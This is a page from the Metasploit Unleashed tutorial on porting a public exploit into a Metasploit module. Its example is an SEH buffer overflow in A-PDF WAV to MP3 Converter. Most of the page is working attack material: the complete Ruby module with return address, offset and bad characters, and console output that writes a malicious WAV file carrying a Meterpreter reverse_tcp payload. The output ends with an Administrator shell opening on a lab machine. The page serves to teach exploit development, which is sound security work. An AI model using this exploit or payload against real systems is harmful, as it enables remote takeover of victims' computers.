<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
  <meta content="text/html; charset=ISO-8859-1"
 http-equiv="Content-Type">
  <title>Porting Exploits</title>
<link rel="stylesheet" type="text/css" href="/home/steve/metasploit_unleashed/css.css" /></head>
<body>
<h1 style="color: rgb(0, 0, 0);" id="firstHeading" class="firstHeading">Porting
Exploits</h1>
<h3 style="color: rgb(0, 0, 0);" id="siteSub">From Metasploit Unleashed
- Mastering The Framework</h3>
<p style="color: rgb(0, 0, 0);">Although Metasploit is commercially
owned, it is still an open
source project and grows and thrives based on user-contributed modules.
As there are only a handful of full-time developers on the team, there
is a great opportunity to port existing public exploits to the
Metasploit Framework. Porting exploits will not only help make
Metasploit more versatile and powerful, it is also an excellent way to
learn about the inner workings of the framework and helps you improve
your Ruby skills at the same time. One very important point to remember
when writing Metasploit modules is that you *always* need to use hard
tabs and not spaces. For a few other important module details, refer to
the 'HACKING' file located in the root of the Metasploit directory.
There is some important information that will help ensure your
submissions are quickly added to the trunk.
</p>
<p style="color: rgb(0, 0, 0);">To begin, we'll first need to obviously
select an exploit to
port over. We will use the A-PDF WAV to MP3 Converter exploit as
published at <a href="http://www.exploit-db.com/exploits/14681"
 class="external free" rel="nofollow">http://www.exploit-db.com/exploits/14681</a>.
When
porting exploits, there is no need to start coding completely from
scratch; we can simply select a pre-existing exploit module and modify
it to suit our purposes. Since this is a fileformat exploit, we will
look under modules/exploits/windows/fileformat/ off the main Metasploit
directory for a suitable candidate. This particular exploit is a SEH
overwrite so we need to find a module that uses the
Msf::Exploit::Remote::Seh mixin. We can find this near the top of the
exploit audiotran_pls.rb as shown below.
<br>
<br>
</p>
<pre id="code">require 'msf/core'<br><br>class Metasploit3 &lt; Msf::Exploit::Remote<br>        Rank = GoodRanking<br><br>        include Msf::Exploit::FILEFORMAT<br>        include Msf::Exploit::Remote::Seh</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Having found a suitable template to
use for our module, we then
strip out everything specific to the existing module and save it under
~/.msf3/modules/exploits/windows/fileformat/ . You may need to create
the additional directories under your home directory if you are
following along exactly. Note that it is possible to save the custom
module under the main Metasploit directory but it can cause issues when
updating the framework if you end up submitting a module to be included
in the trunk. Our stripped down exploit looks like this:
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">##<br># $Id: $<br>##<br><br>##<br># This file is part of the Metasploit Framework and may be subject to<br># redistribution and commercial restrictions. Please see the Metasploit<br># Framework web site for more information on licensing and terms of use.<br># http://metasploit.com/framework/<br>##<br><br>require 'msf/core'<br><br>class Metasploit3 &lt; Msf::Exploit::Remote<br>    Rank = GoodRanking<br><br>    include Msf::Exploit::FILEFORMAT<br>    include Msf::Exploit::Remote::Seh<br><br>    def initialize(info = {})<br>        super(update_info(info,<br>            'Name'           =&gt; 'Exploit Title',<br>            'Description'    =&gt; %q{<br>                    Exploit Description<br>            },<br>            'License'        =&gt; MSF_LICENSE,<br>            'Author'         =&gt;<br>                [<br>                    'Author'<br>                ],<br>            'Version'        =&gt; '$Revision: $',<br>            'References'     =&gt;<br>                [<br>                    [ 'URL', 'http://www.somesite.com ],<br>                ],<br>            'Payload'        =&gt;<br>                {<br>                    'Space'    =&gt; 6000,<br>                    'BadChars' =&gt; "\x00\x0a",<br>                    'StackAdjustment' =&gt; -3500,<br>                },<br>            'Platform' =&gt; 'win',<br>            'Targets'        =&gt;<br>                [<br>                    [ 'Windows Universal', { 'Ret' =&gt;  } ],<br>                ],<br>            'Privileged'     =&gt; false,<br>            'DisclosureDate' =&gt; 'Date',<br>            'DefaultTarget'  =&gt; 0))<br><br>            register_options(<br>                [<br>                    OptString.new('FILENAME', [ true, 'The file name.',  'filename.ext']),<br>                ], self.class)<br><br>    end<br><br>    def exploit<br>      <br>        print_status("Creating '#{datastore['FILENAME']}' file ...")<br><br>        file_create(sploit)<br><br>    end<br><br>end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that our skeleton is ready, we
can start plugging in the
information from the public exploit, assuming that it has been tested
and verified that it works. We start by adding the title, description,
author(s), and references. Note that it is common courtesy to name the
original public exploit authors as it was their hard work that found
the bug in the first place.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">    def initialize(info = {})<br>        super(update_info(info,<br>            'Name'           =&gt; 'A-PDF WAV to MP3 v1.0.0 Buffer Overflow',<br>            'Description'    =&gt; %q{<br>                    This module exploits a buffer overflow in A-PDF WAV to MP3 v1.0.0. When<br>                the application is used to import a specially crafted m3u file, a buffer overflow occurs<br>                allowing arbitrary code execution.<br>            },<br>            'License'        =&gt; MSF_LICENSE,<br>            'Author'         =&gt;<br>                [<br>                    'd4rk-h4ck3r',         # Original Exploit<br>                    'Dr_IDE',        # SEH Exploit<br>                    'dookie'        # MSF Module<br>                ],<br>            'Version'        =&gt; '$Revision: $',<br>            'References'     =&gt;<br>                [<br>                    [ 'URL', 'http://www.exploit-db.com/exploits/14676/' ],<br>                    [ 'URL', 'http://www.exploit-db.com/exploits/14681/' ],<br>                ],</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Everything is self-explanatory to
this point and other than the
Metasploit module structure, there is nothing complicated going on so
far. Carrying on farther in the module, we'll ensure the EXITFUNC is
set to 'seh' and set 'DisablePayloadHandler' to 'true' to eliminate any
conflicts with the payload handler waiting for the shell. While
studying the public exploit in a debugger, we have determined that
there are approximately 600 bytes of space available for shellcode and
that \x00 and \x0a are bad characters that will corrupt our shellcode.
Finding bad characters is always tedious but to ensure exploit
reliability, it is a necessary evil. For more information of finding
bad characters, see this link: </span><a style="color: rgb(0, 0, 0);"
 href="http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars"
 class="external free" rel="nofollow">http://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars</a><span
 style="color: rgb(0, 0, 0);">.
In the 'Targets' section, we add the all-important pop/pop/retn return
address for the exploit, the length of the buffer required to reach the
SE Handler, and a comment stating where the address comes from. Since
this return address is from the application binary, the target is
'Windows Universal' in this case. Lastly, we add the date the exploit
was disclosed and ensure the 'DefaultTarget' value is set to 0.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">            'DefaultOptions' =&gt;<br>                {<br>                    'EXITFUNC' =&gt; 'seh',<br>                    'DisablePayloadHandler' =&gt; 'true'<br>                },<br>            'Payload'        =&gt;<br>                {<br>                    'Space'    =&gt; 600,<br>                    'BadChars' =&gt; "\x00\x0a",<br>                    'StackAdjustment' =&gt; -3500<br>                },<br>            'Platform' =&gt; 'win',<br>            'Targets'        =&gt;<br>                [<br>                    [ 'Windows Universal', { 'Ret' =&gt; 0x0047265c, 'Offset' =&gt; 4132 } ],    # p/p/r in wavtomp3.exe<br>                ],<br>            'Privileged'     =&gt; false,<br>            'DisclosureDate' =&gt; 'Aug 17 2010',<br>            'DefaultTarget'  =&gt; 0))</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The last part we need to edit before
moving on to the actual
exploit is the 'register_options' section. In this case, we need to
tell Metasploit what the default filename will be for the exploit. In
network-based exploits, this is where we would declare things like the
default port to use.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">        register_options(<br>            [<br>                OptString.new('FILENAME', [ false, 'The file name.', 'msf.wav']),<br>            ], self.class)</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">The final, and most interesting,
section to edit is the 'exploit'
block where all of the pieces come together. First,
rand_text_alpha_upper(target['Offset']) will create our buffer leading
up to the SE Handler using random, upper-case alphabetic characters
using the length we specified in the 'Targets' block of the module.
Next, generate_seh_record(target.ret) adds the short jump and return
address that we normally see in public exploits. The next part,
make_nops(12), is pretty self-explanatory; Metasploit will use a
variety of No-Op instructions to aid in IDS/IPS/AV evasion. Lastly,
payload.encoded adds on the dynamically generated shellcode to the
exploit. A message is printed to the screen and our malicious file is
written to disk so we can send it to our target.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">    def exploit<br><br>        sploit = rand_text_alpha_upper(target['Offset'])<br>        sploit &lt;&lt; generate_seh_record(target.ret)<br>        sploit &lt;&lt; make_nops(12)<br>        sploit &lt;&lt; payload.encoded<br>           <br>        print_status("Creating '#{datastore['FILENAME']}' file ...")<br><br>        file_create(sploit)<br>       <br>    end</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Now that we have everything edited,
we can take our newly created module for a test drive.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf &gt; search a-pdf<br>[*] Searching loaded modules for pattern 'a-pdf'...<br><br>Exploits<br>========<br><br>   Name                                              Rank    Description<br>   ----                                              ----    -----------<br>   windows/browser/adobe_flashplayer_newfunction     normal  Adobe Flash Player "newfunction" Invalid Pointer Use<br>   windows/fileformat/a-pdf_wav_to_mp3               normal  A-PDF WAV to MP3 v1.0.0 Buffer Overflow<br>   windows/fileformat/adobe_flashplayer_newfunction  normal  Adobe Flash Player "newfunction" Invalid Pointer Use<br><br>msf &gt; use exploit/windows/fileformat/a-pdf_wav_to_mp3<br>msf exploit(a-pdf_wav_to_mp3) &gt; show options<br><br>Module options:<br><br>   Name        Current Setting                      Required  Description<br>   ----        ---------------                      --------  -----------<br>   FILENAME    msf.wav                              no        The file name.<br>   OUTPUTPATH  /opt/metasploit3/msf3/data/exploits  yes       The location of the file.<br><br><br>Exploit target:<br><br>   Id  Name<br>   --  ----<br>   0   Windows Universal<br><br><br>msf exploit(a-pdf_wav_to_mp3) &gt; set OUTPUTPATH /var/www<br>OUTPUTPATH =&gt; /var/www<br>msf exploit(a-pdf_wav_to_mp3) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(a-pdf_wav_to_mp3) &gt; set LHOST 192.168.1.101<br>LHOST =&gt; 192.168.1.101<br>msf exploit(a-pdf_wav_to_mp3) &gt; exploit<br><br>[*] Started reverse handler on 192.168.1.101:4444<br>[*] Creating 'msf.wav' file ...<br>[*] Generated output file /var/www/msf.wav<br>[*] Exploit completed, but no session was created.<br>msf exploit(a-pdf_wav_to_mp3) &gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Everything seems to be working fine
so far. Now we just need to
setup a meterpreter listenter and have our victim open up our malicious
file in the vulnerable application.
</span><br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<pre id="code">msf exploit(a-pdf_wav_to_mp3) &gt; use exploit/multi/handler<br>msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_tcp<br>PAYLOAD =&gt; windows/meterpreter/reverse_tcp<br>msf exploit(handler) &gt; set LHOST 192.168.1.101<br>LHOST =&gt; 192.168.1.101<br>msf exploit(handler) &gt; exploit<br><br>[*] Started reverse handler on 192.168.1.101:4444<br>[*] Starting the payload handler...<br>[*] Sending stage (748544 bytes) to 192.168.1.160<br>[*] Meterpreter session 1 opened (192.168.1.101:4444 -&gt; 192.168.1.160:53983) at 2010-08-31 20:59:04 -0600<br><br><u>meterpreter</u> &gt; sysinfo<br>Computer: XEN-XP-PATCHED<br>OS      : Windows XP (Build 2600, Service Pack 3).<br>Arch    : x86<br>Language: en_US<br><u>meterpreter</u>&gt; getuid<br>Server username: XEN-XP-PATCHED\Administrator<br><u>meterpreter</u>&gt;</pre>
<br style="color: rgb(0, 0, 0);">
<span style="color: rgb(0, 0, 0);">Success! Not all exploits are this
easy to port over but the time
spent is well worth it and helps to make an already excellent tool even
better.
For further information on porting exploits and contributing to
Metasploit in general, see the following links:
</span><br style="color: rgb(0, 0, 0);">
<a style="color: rgb(0, 0, 0);"
 href="http://www.metasploit.com/redmine/projects/framework/repository/entry/HACKING"
 class="external free" rel="nofollow">http://www.metasploit.com/redmine/projects/framework/repository/entry/HACKING</a>
<br style="color: rgb(0, 0, 0);">
<a style="color: rgb(0, 0, 0);"
 href="http://www.metasploit.com/redmine/projects/framework/wiki/PortingExploits"
 class="external free" rel="nofollow">http://www.metasploit.com/redmine/projects/framework/wiki/PortingExploits</a>
<br style="color: rgb(0, 0, 0);">
<a style="color: rgb(0, 0, 0);"
 href="http://www.metasploit.com/redmine/projects/framework/wiki/ExploitModuleDev"
 class="external free" rel="nofollow">http://www.metasploit.com/redmine/projects/framework/wiki/ExploitModuleDev</a>
<br style="color: rgb(0, 0, 0);">
<br style="color: rgb(0, 0, 0);">
<div style="text-align: center; color: rgb(0, 0, 0);"><a
 href="http://www.offensive-security.com/metasploit-unleashed/Exploit_Development"
 title="Exploit Development">Exploit Development</a></div>
</body>
</html>
